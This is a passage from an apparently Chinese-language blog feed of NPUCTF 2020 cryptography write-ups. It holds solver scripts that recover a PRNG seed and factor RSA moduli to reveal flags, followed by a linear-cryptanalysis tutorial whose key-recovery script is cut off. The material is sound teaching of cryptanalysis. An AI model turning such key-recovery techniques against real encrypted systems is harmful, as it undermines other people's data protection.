class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[1]:</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[2]:</span></span><br><span class="line">cipher = unhexlify(open(<span class="string">"cipher.txt"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[3]:</span></span><br><span class="line">XOR = <span class="keyword">lambda</span> s1 ,s2 : bytes([x1 ^ x2 <span class="keyword">for</span> x1 ,x2 <span class="keyword">in</span> zip(s1 , s2)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[4]:</span></span><br><span class="line">prefix_mt_output = []</span><br><span class="line">prefix = <span class="string">b'npuctf&#123;'</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> prefix:</span><br><span class="line">    tmp = md5(chr(i).encode()).digest()</span><br><span class="line">    randnum = XOR(tmp, cipher[<span class="number">16</span> * j : <span class="number">16</span> * (j + <span class="number">1</span>)])</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        prefix_mt_output.append(bytes_to_long(randnum[<span class="number">4</span> * k : <span class="number">4</span> * (k + <span class="number">1</span>)]))</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[5]:</span></span><br><span class="line">suffix_mt_output = [] <span class="comment">#output[100]~output[103]</span></span><br><span class="line">suffix = <span class="string">b'&#125;'</span></span><br><span class="line">tmp = md5(suffix).digest()</span><br><span class="line">randnum = XOR(tmp, cipher[<span class="number">16</span> * <span class="number">25</span> : <span class="number">16</span> * <span class="number">26</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    suffix_mt_output.append(bytes_to_long(randnum[<span class="number">4</span> * i : <span class="number">4</span> * (i + <span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[6]:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftLeftXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = (<span class="number">0xffffffff</span> &gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &lt;&lt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftRightXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = ((<span class="number">0xffffffff</span> &lt;&lt; (<span class="number">32</span> - shift)) &amp; <span class="number">0xffffffff</span>) &gt;&gt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &gt;&gt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recoverState</span><span class="params">(value)</span>:</span></span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">18</span>, <span class="number">0x34adf670</span>)</span><br><span class="line">    value = unBitshiftLeftXor(value, <span class="number">15</span>, <span class="number">0xefc65400</span>)</span><br><span class="line">    value = unBitshiftLeftXor(value, <span class="number">7</span>, <span class="number">0x9ddf4680</span>)</span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">11</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[7]:</span></span><br><span class="line">prefix_state = []</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> prefix_mt_output:</span><br><span class="line">    prefix_state.append(recoverState(value))</span><br><span class="line">suffix_state = [] <span class="comment">#state[100]~state[103]</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> suffix_mt_output:</span><br><span class="line">    suffix_state.append(recoverState(value))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[22]:</span></span><br><span class="line">cur = suffix_state[<span class="number">-1</span>] <span class="comment">#state[103]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[23]:</span></span><br><span class="line">cur ^= prefix_state[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[24]:</span></span><br><span class="line"><span class="keyword">if</span> size(cur) &gt; <span class="number">31</span>: <span class="comment">#最高比特一定要是0</span></span><br><span class="line">    print(<span class="string">"old_state[104] &amp; 1 == 1"</span>)</span><br><span class="line">    cur ^= <span class="number">0x9908f23f</span> <span class="comment">#奇数</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"old_state[104] &amp; 1 == 0"</span>) <span class="comment">#偶数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[25]:</span></span><br><span class="line">cur &lt;&lt;= <span class="number">1</span> <span class="comment">#偶数末尾比特=0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[26]:</span></span><br><span class="line">s104_1 = cur &amp; <span class="number">0x7fffffff</span></span><br><span class="line">s104_2 = s104_1 | <span class="number">0x80000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># In[27]:</span></span><br><span class="line">coef = inverse(<span class="number">1812433253</span>, <span class="number">0x100000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_srand</span><span class="params">(value, i)</span>:</span></span><br><span class="line">    value &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    value += i</span><br><span class="line">    value *= coef</span><br><span class="line">    value = unBitshiftRightXor(value, <span class="number">27</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[28]:</span></span><br><span class="line"><span class="keyword">if</span> inv_srand(s104_1, <span class="number">103</span>) &amp; <span class="number">0x80000000</span> == cur &amp; <span class="number">0x80000000</span>:</span><br><span class="line">    <span class="keyword">if</span> inv_srand(s104_2, <span class="number">103</span>) &amp; <span class="number">0x80000000</span> == cur &amp; <span class="number">0x80000000</span>:</span><br><span class="line">        print(<span class="string">"two cases found"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s104 = s104_1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s104 = s104_2</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[29]:</span></span><br><span class="line">cur = s104</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">103</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    cur = inv_srand(cur, i)</span><br><span class="line">seed = cur</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[30]:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mt73991</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self , seed)</span>:</span></span><br><span class="line">        self.state = [seed] + [<span class="number">0</span>] * <span class="number">232</span></span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        self.srand()</span><br><span class="line">        self.generate()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">srand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">232</span>):</span><br><span class="line">            self.state[i+<span class="number">1</span>] = <span class="number">1812433253</span> * (self.state[i] ^ (self.state[i] &gt;&gt; <span class="number">27</span>)) - i</span><br><span class="line">            self.state[i+<span class="number">1</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">233</span>):</span><br><span class="line">            y = (self.state[i] &amp; <span class="number">0x80000000</span>) | (self.state[(i+<span class="number">1</span>)%<span class="number">233</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            temp = y &gt;&gt; <span class="number">1</span></span><br><span class="line">            temp ^= self.state[(i + <span class="number">130</span>) % <span class="number">233</span>]</span><br><span class="line">            <span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">                temp ^= <span class="number">0x9908f23f</span></span><br><span class="line">            self.state[i] = temp</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getramdanbits</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.flag == <span class="number">233</span>:</span><br><span class="line">            self.generate()</span><br><span class="line">            self.flag = <span class="number">0</span></span><br><span class="line">        bits = self.Next(self.state[self.flag]).to_bytes(<span class="number">4</span> , <span class="string">'big'</span>)</span><br><span class="line">        self.flag += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Next</span><span class="params">(self , tmp)</span>:</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9ddf4680</span></span><br><span class="line">        tmp ^= (tmp &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc65400</span></span><br><span class="line">        tmp ^= (tmp &gt;&gt; <span class="number">18</span>) &amp; <span class="number">0x34adf670</span></span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[31]:</span></span><br><span class="line">random = mt73991(seed)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[32]:</span></span><br><span class="line">pt = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    key = <span class="string">b''</span>.join([random.getramdanbits() <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>)])</span><br><span class="line">    pt += XOR(key, cipher[<span class="number">16</span> * i : <span class="number">16</span> * (i + <span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[33]:</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str_set = string.printable.encode()</span><br><span class="line">md5_set = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str_set:</span><br><span class="line">    md5_set.append(md5(chr(i).encode()).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[34]:</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    idx = md5_set.index(pt[<span class="number">16</span> * i:<span class="number">16</span> * (i + <span class="number">1</span>)])</span><br><span class="line">    flag += chr(str_set[idx])</span><br><span class="line">flag</span><br></pre></td></tr></table></figure><h4 id="More-1"><a href="#More-1" class="headerlink" title="[More]"></a>[More]</h4><p>解<code>old_state[103]</code>那里采用z3解方程失败（原因是Int类型不支持位运算，但BitVec(‘s103’, 32)又是在$GF(2^{32})$上的元，基础运算定义不一致，求解结果错误）</p><p>因此采用了手动解方程的办法，后续如果知道有轮子再补</p><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><h4 id="题目考点-2"><a href="#题目考点-2" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>共模攻击</li><li>有限域开根</li><li>CopperSmith</li></ul><h4 id="题目文件-2"><a href="#题目文件-2" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="ezrsa_c799462e82d9c969f1d28a373733e6f1.zip.zip">Click Here to Download</a></p><h4 id="题解分析-2"><a href="#题解分析-2" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>hint.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = bytes_to_long(hint)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">c = pow(m, <span class="number">256</span>, p)</span><br><span class="line">print(p)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># c可以通过真·共模求出来</span></span><br></pre></td></tr></table></figure><p>256非素数，懒得自己写有限域开根高效算法了…sage直接来</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-21_21-49-44.png" alt></p><p>再回到task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = p, q</span><br><span class="line">c1, c2 = pow(m, e1, n), pow(m, e2, n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br></pre></td></tr></table></figure><p>hint给出m比特长度上界，联想到coppersmith，再可行性分析如下：</p><p>$c1\equiv m^{p}\equiv m(mod\ p),c2\equiv m^{q}\equiv m(mod\ q)$</p><p>$\therefore n|(c1-m)(c2-m)$</p><p>上界分析$\frac{1}{2}n^{\frac{1^{2}}{2}}\approx 2^{511}$，而上面hint已经给了size(m)&lt;400，所以可行性分析通过</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-21_21-58-34.png" alt></p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><p>没完整的- -按上面的截图手动测就好</p><h4 id="More-2"><a href="#More-2" class="headerlink" title="[More]"></a>[More]</h4><p>coin师傅还是强啊quq</p><h3 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h3><h4 id="题目考点-3"><a href="#题目考点-3" class="headerlink" title="[题目考点]"></a>[题目考点]</h4><ul><li>已知(e, n, d)恢复(p, q)</li><li>Rabin解密</li></ul><h4 id="题目文件-3"><a href="#题目文件-3" class="headerlink" title="[题目文件]"></a>[题目文件]</h4><p><a href="difficultrsa.py">Click Here to Download</a></p><h4 id="题解分析-3"><a href="#题解分析-3" class="headerlink" title="[题解分析]"></a>[题解分析]</h4><p>题目给出<code>n</code>，<code>lcm(p-1,q-1)</code>，<code>c</code>，<code>e</code>，测试发现<code>GCD(e, lcm) == 2</code></p><p>因此令<code>d=inverse(e//2,lcm)</code>，则$m^{2}\equiv c^{d}(mod\ n)$</p><p>但非有限域下的二次根求解难度在m足够大的时候几乎不可行，于是思路转向分解n</p><p>比赛的时候发现<code>size(lcm) == 2045</code>，也就是说<code>GCD(p-1,q-1)</code>极小，爆破小素数组合即可，发现GCD为8</p><p>成功分解N，求解Rabin即可（当然，这是非预期…shallow师傅后来提了一下才反应过来，这道题考察的点实际上是已知(e, n, d)来分解n）</p><p>关于已知(e, n, d)分解N，我在之前的博客也提到过<a href="http://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#rsa---given-e-d-n" target="_blank" rel="noopener">http://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#rsa—-given-e-d-n</a></p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">lcm = </span><br><span class="line">e = </span><br><span class="line"><span class="keyword">assert</span>(GCD(lcm, e) == <span class="number">2</span>)</span><br><span class="line">n = </span><br><span class="line">d = inverse(e // <span class="number">2</span>, lcm)</span><br><span class="line">m2 = pow(c, d, n) <span class="comment"># m^2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Factorize</span><span class="params">(n, e, d)</span>:</span></span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = e * d - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            k //= <span class="number">2</span></span><br><span class="line">            p = int(gcd(pow(g, k, n) - <span class="number">1</span>, n)) % n</span><br><span class="line">            <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">        g = int(next_prime(g))</span><br><span class="line">        </span><br><span class="line">(p, q) = Factorize(n, e // <span class="number">2</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面求解Rabin是用sage手动测的，如果想合成完整脚本的话请用求解Rabin的脚本(多种可能要进行筛选)</span></span><br><span class="line">m_p = sympy.nthroot_mod(m2, <span class="number">2</span>, p)</span><br><span class="line">m_q = sympy.nthroot_mod(m2, <span class="number">2</span>, q)</span><br><span class="line">m = crt([m_p, m_q], [p, q])</span><br><span class="line">long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'NPUCTF&#123;diff1cult_rsa_1s_e@sy&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="EzLCG"><a href="#EzLCG" class="headerlink" title="EzLCG"></a>EzLCG</h3><h4 id="出题手记"><a href="#出题手记" class="headerlink" title="[出题手记]"></a>[出题手记]</h4><p><a href="EzLCG.pdf">Click Here to Download</a></p><h3 id="EzSPN"><a href="#EzSPN" class="headerlink" title="EzSPN"></a>EzSPN</h3><h4 id="出题手记-1"><a href="#出题手记-1" class="headerlink" title="[出题手记]"></a>[出题手记]</h4><p><a href="EzSPN.pdf">Click Here to Download</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(Block)</title>
      <link href="/2020/04/11/Summary-of-Crypto-in-CTF-Block/"/>
      <url>/2020/04/11/Summary-of-Crypto-in-CTF-Block/</url>
      
        <content type="html"><![CDATA[<h3 id="Feistel-SP结构"><a href="#Feistel-SP结构" class="headerlink" title="Feistel-SP结构"></a>Feistel-SP结构</h3><p>下图即为Feistel-SP结构的通用模型，其中F函数是SP结构</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_13-55-29.png" alt></p><p>注：$X_{i}^{1}$和$Y_{i}^{1}$分别表示<strong>通过$S_{1}$的输入和输出向量</strong>，$X_{i}^{j},Y_{i}^{j}$类似.</p><h3 id="线性分析"><a href="#线性分析" class="headerlink" title="线性分析"></a>线性分析</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h4><p>基本方法即为寻找一个给定密码系统下，具有如下形式的有效线性表达式</p><script type="math/tex; mode=display">P[i_{1},...,i_{a}]\oplus C[j_{1},...,j_{b}]=K[k_{1},...,k_{c}]</script><p>($i_{1},…,i_{a};j_{1},…,j_{b};k_{1},…,k_{c}$均为固定比特位)</p><p>设$X_{1},X_{2},…,X_{k}$为$\{0,1\}$上的独立随机变量，$Pr(X_{i}=0)=p_{i},Pr(X_{i}=1)=1-p_{i}$，则用分布偏差来表示其概率分布，定义如下</p><script type="math/tex; mode=display">\epsilon_{i}=p_{i}-\frac{1}{2}</script><p>[堆积引理] - $Pr(X_{1}\oplus …\oplus X_{n}=0)=\frac{1}{2}+2^{n-1}\prod_{i=1}^{n}\epsilon_{i}$，或表示为$\epsilon_{1,2,…,n}=2^{n-1}\prod_{i=1}^{n}\epsilon_{i}$.</p><p>利用堆积引理，我们即可以对每轮变换中偏差最大的线性逼近式进行组合，组合后的线性逼近式也将拥有最佳的偏差，即为要找的最佳线性逼近式</p><p>[SPN]</p><p>下为单轮SPN的示意图</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-04-11_23-20-06.png" alt></p><p>可见非线性结构只有S盒，因此只对其作偏差估计，具体方法如下（假设S盒为16*16）：</p><p>将输入的线性近似表示为$a_{1}\cdot X_{1}\oplus a_{2}\cdot X_{2}\oplus …\oplus a_{8}\cdot X_{8}(a_{i}\in \{0,1\})$，对应的，我们也将输出线性近似表示为$b_{1}\cdot Y_{1}\oplus b_{2}\cdot Y_{2}\oplus …\oplus b_{8}\cdot Y_{8}(b_{i}\in \{0,1\})$，穷举所有组合$(a,b)$对应的使得线性近似输入$\oplus$线性近似输出=0的偏差 (256*256)</p><p>偏差计算公式$\epsilon(a,b)=(N_{L}(a,b)-128)/256$（$N_{L}(a,b)$为固定(a,b)下，满足上述条件的(X,Y)的个数）</p><p>我们的目的就是要找到$|\epsilon(a,b)|_{max}$对应的线性表达式，将其作为该单个S盒下的最佳线性估计</p><p>以下面的SPN网络进行讨论分析：</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/QQ图片20200412233456.jpg" alt></p><p>中间的P盒如下：</p><script type="math/tex; mode=display">\left[\begin{matrix}1 & 9 & 17 & 25 & 33 & 41 & 49 & 57\\2 & 10 & 18 & 26 & 34 & 42 & 50 & 58\\... & ... & ... & ... & ... & ... & ... & ...\\8 & 16 & 24 & 32 & 40 & 48 & 56 & 64\end{matrix}\right]</script><p>为方便分析，我们假设$S_{11}=S_{12}=…=S_{18}$，在找合适的线性逼近前，我们要知道以下两点：</p><ul><li>每个线性逼近对应的密钥子集猜测空间不能过大（这里我们使得每个线性逼近表达式里的$C_{i}$满足$8j&lt; i\leq 8(j+1)$，j在每次猜测下各自固定）</li><li>涉及线性估计的S盒不能过多（堆积引理$\epsilon_{1,2,…,n}=2^{n-1}\prod_{i=1}^{n}\epsilon_{i}$可知，总偏移量的绝对值会随着n的增大而减小，总偏移量过小会使得在猜测密钥时的成功率极低）</li></ul><p>因此我们选择分别对应$S_{11}$八个输出的八个$S_{11}$的最大偏差线性估计，来进行八个第二轮子密钥的猜测（基于不正确的随机密钥会使得测试的明密文对中，满足线性表达式的概率趋于$\frac{1}{2}$，即偏差减小），总的猜测空间为256*8</p><p>以$K_{2,1},K_{2,2},…,K_{2,8}$为例，取$u_{1}$为$S_{21}^{-1}(C_{1}\oplus K_{2,1}||C_{2}\oplus K_{2,2}||…||C_{8}\oplus K_{2,8})$的最高位比特</p><p>从上述S盒的分析得出$S_{11}$固定$b=10000000$时，最大偏差线性估计对应的$a(a_{1}a_{2}a_{3}a_{4}a_{5}a_{6}a_{7}a_{8})$，因为$K_{1,i}s$异或为定值(0/1)，故不予加入线性表达式，$u_{2}$取为$P_{a_{i}}s$的异或$(a_{i}均等于1)$</p><p>密钥空间为256，且每次取相同10000组数据进行线性分析，则假设使得$u_{1}\oplus u_{2}=0$成立的组数为N，$bias=|\frac{N-5000}{10000}|$，很大概率下，$bias_{max}$对应的即为正确密钥</p><p>第二轮子密钥完全恢复后，任取一组明密文对即可轻易恢复第一轮子密钥，线性分析结束</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>以NPUCTF2020出的EzSPN为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SZ = <span class="number">8</span></span><br><span class="line">offset = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]  <span class="comment">#Sbox线性估计offset</span></span><br><span class="line">linearInput = []</span><br><span class="line">sbox, sboxi, plain, cipher = [], [], [], []</span><br><span class="line">enc_flag = <span class="literal">None</span></span><br><span class="line">coef = [<span class="number">15</span>, <span class="number">11</span>, <span class="number">155</span>, <span class="number">119</span>, <span class="number">11</span>, <span class="number">99</span>, <span class="number">83</span>, <span class="number">249</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> enc_flag, sbox, sboxi</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">    sbox_str = io.recvline()</span><br><span class="line">    sbox = eval(sbox_str)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    sboxi.append(sbox.index(i))</span><br><span class="line">    enc_flag = io.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        print(<span class="string">"[+] Getting data...(&#123;&#125;/10000)"</span>.format(i))</span><br><span class="line">        pt = hexlify(os.urandom(<span class="number">8</span>)).decode(<span class="string">"utf8"</span>)</span><br><span class="line">        